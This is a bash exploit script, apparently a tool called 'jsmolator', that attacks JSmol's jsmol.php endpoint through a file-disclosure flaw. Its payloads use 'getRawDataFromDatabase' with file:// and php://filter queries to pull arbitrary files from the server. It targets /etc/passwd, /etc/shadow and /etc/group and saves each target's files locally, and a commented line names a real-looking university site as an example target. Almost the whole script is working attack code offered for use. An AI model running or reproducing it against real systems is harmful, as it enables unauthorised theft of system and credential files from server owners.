#!/bin/bash
# CHORFA A.
# dino213DZ@gmail.com
# V 0.1 08.02.2020
#
#####################
#includes
script_path=$(echo "$0"|rev|cut -d '/' -f 2-|rev )
cd $script_path
source 'jsmolator.conf'
source 'jsmolator.fct'
#####################

#attack params
#jsmolphp_url='http://www.lct.jussieu.fr/pagesperso/orbimol/script/jsmol/php/jsmol.php'
jsmolphp_url="$1"
payload_txt='call=getRawDataFromDatabase&query=file://'
payload_b64='isform=true&call=getRawDataFromDatabase&source=post_page---------------------------&query=php://filter/resource='
#debug : ligne a supprimer
#download_files='/etc/passwd /etc/shadow /etc/group'
download_files=$(cat "$dl_list_file"|egrep -v "^#")
total_files_to_dl=$(cat $dl_list_file|wc -l)
attack_date_start=$(/bin/date "+%s")

#working vars
continue_tests='TRUE'
is_vuln='FALSE'
payload_types=('TXT' 'B64')
functionnal_payload=''
got_passwd='FALSE'
got_shadow='FALSE'
got_group='FALSE'

if [ ${#1} -eq 0 ];then
	echo "$0 [http://target/uri/till/jsmol.php]"
	exit 1;
fi

#start
showBanner

#show infos
touch "$curl_output_filename"
showTitle "Attack information" "" "0"
showTitle "Target" "$jsmolphp_url" "1"

showTitle "Trying payloads" "" "0"
for target_test_filename in ${target_test_files[*]};do
	for payload_test in ${payload_types[*]};do
		#try payload 
		showTitle "Getting $target_test_filename" "Payload type $payload_test" "1"
		checkFile "$target_test_filename" "$payload_test"
	done
	if [ $continue_tests != "TRUE" ];then
		showTitle "Success" "Payload $payload_test works well!" "2"
		break
	fi
done

showTitle "Results" "" "0"
if [ $is_vuln = "TRUE" ];then
	showTitle "This shit is vulnerable!" "$c_warn""Enjoy!" "1"
	#convert target domaine to folder
	dl_sub_folder=$(echo "$jsmolphp_url"|cut -d '/' -f 3)
	showTitle "Downloding files" "" "0"
	#create download folder
	showTitle "Creating download folders" "" "1"
	checkFolders "$dl_sub_folder"
	#dl files
	downloadFiles "$dl_sub_folder"
	listDownloadedFiles "$dl_sub_folder"
	
	showTitle "Check this before quitting" "" "1" "noNL"
	#debug pause	
	#read pause
else
	showTitle "This shit is not vulnerable!" "$c_error""Game over!" "1"
fi
#logging in history file=
attack_date_end=$(/bin/date "+%s")
attack_duration=$(( $attack_date_end-$attack_date_start ))
saveToHistory
#end
showTitle "Quitting" "" "0"
showTitle "Remove temporary files" "" "1"
rm -f "$curl_output_filename" 2>/dev/null 1>/dev/null
cd $OLDPATH
showTitle "Bye" "" "1"
echo -en "$c_reset"
exit 0
